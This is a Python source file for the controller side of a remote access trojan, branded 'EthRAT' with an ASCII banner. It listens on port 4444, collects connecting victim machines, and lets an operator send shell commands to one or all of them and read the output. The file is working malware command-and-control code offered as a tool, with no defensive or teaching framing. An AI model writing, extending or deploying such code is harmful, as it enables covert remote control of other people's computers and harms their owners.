import socket
import threading
import os
from colorama import Fore
import ctypes
import sys

clients = {}
shutdown = False 

def logo():
    print(Fore.GREEN + r"""
EEEEEEEEEEEEEEEEEEEEEE         tttt         hhhhhhh             RRRRRRRRRRRRRRRRR                  AAA         TTTTTTTTTTTTTTTTTTTTTTT
E::::::::::::::::::::E      ttt:::t         h:::::h             R::::::::::::::::R                A:::A        T:::::::::::::::::::::T
E::::::::::::::::::::E      t:::::t         h:::::h             R::::::RRRRRR:::::R              A:::::A       T:::::::::::::::::::::T
EE::::::EEEEEEEEE::::E      t:::::t         h:::::h             RR:::::R     R:::::R            A:::::::A      T:::::TT:::::::TT:::::T
  E:::::E       EEEEEEttttttt:::::ttttttt    h::::h hhhhh         R::::R     R:::::R           A:::::::::A     TTTTTT  T:::::T  TTTTTT
  E:::::E             t:::::::::::::::::t    h::::hh:::::hhh      R::::R     R:::::R          A:::::A:::::A            T:::::T        
  E::::::EEEEEEEEEE   t:::::::::::::::::t    h::::::::::::::hh    R::::RRRRRR:::::R          A:::::A A:::::A           T:::::T        
  E:::::::::::::::E   tttttt:::::::tttttt    h:::::::hhh::::::h   R:::::::::::::RR          A:::::A   A:::::A          T:::::T        
  E:::::::::::::::E         t:::::t          h::::::h   h::::::h  R::::RRRRRR:::::R        A:::::A     A:::::A         T:::::T        
  E::::::EEEEEEEEEE         t:::::t          h:::::h     h:::::h  R::::R     R:::::R      A:::::AAAAAAAAA:::::A        T:::::T        
  E:::::E                   t:::::t          h:::::h     h:::::h  R::::R     R:::::R     A:::::::::::::::::::::A       T:::::T        
  E:::::E       EEEEEE      t:::::t    tttttth:::::h     h:::::h  R::::R     R:::::R    A:::::AAAAAAAAAAAAA:::::A      T:::::T        
EE::::::EEEEEEEE:::::E      t::::::tttt:::::th:::::h     h:::::hRR:::::R     R:::::R   A:::::A             A:::::A   TT:::::::TT      
E::::::::::::::::::::E      tt::::::::::::::th:::::h     h:::::hR::::::R     R:::::R  A:::::A               A:::::A  T:::::::::T      
E::::::::::::::::::::E        tt:::::::::::tth:::::h     h:::::hR::::::R     R:::::R A:::::A                 A:::::A T:::::::::T      
EEEEEEEEEEEEEEEEEEEEEE          ttttttttttt  hhhhhhh     hhhhhhhRRRRRRRR     RRRRRRRAAAAAAA                   AAAAAAATTTTTTTTTTT
    """ + Fore.RESET)

def handle_client(client_socket, addr):
    clients[addr] = client_socket
    if os.name == "nt":
        ctypes.windll.kernel32.SetConsoleTitleW(f"MY RAT | CONNECTED CLIENTS: {len(clients)}")

    while not shutdown: 
        try:
            response = client_socket.recv(4096).decode()
            if not response:
                break
            print(f"\n{Fore.GREEN}[{addr[0]} Output]: {Fore.RESET}{response}")
        except (ConnectionResetError, BrokenPipeError, OSError):
            break

    print(f"\n{Fore.RED}[-]{Fore.RESET} Client {addr[0]} disconnected")
    client_socket.close()
    if addr in clients:
        del clients[addr]

def accept_clients(server):
    while not shutdown: 
        try:
            client_socket, addr = server.accept()
            print(f"\n{Fore.GREEN}[+]{Fore.RESET} New connection from {addr[0]}:{addr[1]}")
            threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()
        except OSError as e:
            if not shutdown:
                print(f"Error accepting new client: {e}")
            break

def start_server(host="0.0.0.0", port=4444):
    global shutdown

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)

    threading.Thread(target=accept_clients, args=(server,), daemon=True).start()
    os.system("cls" if os.name == "nt" else "clear")
    logo()
    print(f"[{Fore.GREEN}*{Fore.RESET}] Listening on {host}:{port}")
    print(f"[{Fore.YELLOW}?{Fore.RESET}] Waiting for clients to connect...")

    while True:
        if not clients:
            continue
        
        print("\n[Connected Clients]")
        for idx, addr in enumerate(clients.keys(), start=1):
            print(f"{idx}. {addr[0]}:{addr[1]}")

        try:
            choice = input("Select client number (or 0 to broadcast): ")
            if choice.lower() == "exit":
                print(f"[{Fore.YELLOW}*{Fore.RESET}] Shutting down server...")
                shutdown = True  
                server.close() 
                for client in clients.values():
                    client.close() 
                print(f"[{Fore.GREEN}+{Fore.RESET}] Server closed.")
                break
            elif choice.lower() == "list":
                print("\n[Connected Clients]")
                for idx, addr in enumerate(clients.keys(), start=1):
                    print(f"{idx}. {addr[0]}:{addr[1]}")
                continue 
            else:
                choice = int(choice) - 1
        except ValueError:
            print(f"[{Fore.RED}!{Fore.RESET}] Invalid input. Please enter a number, 'exit', or 'list'.")
            continue

        if choice == -1:
            command = input("Enter command to send (broadcast): ")
            for client in clients.values():
                client.send(command.encode())
        elif 0 <= choice < len(clients):
            target_addr = list(clients.keys())[choice]
            print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Interracting with {target_addr[0]}")
            while True:
                command = input(f"{target_addr[0]}> ")
                if command.lower() == "back":
                    print(f"{Fore.YELLOW}[*]{Fore.RESET} Returning to the main menu...")
                    break
                clients[target_addr].send(command.encode())
        else:
            print(f"[{Fore.RED}!{Fore.RESET}] Invalid selection")

if __name__ == "__main__":
    start_server()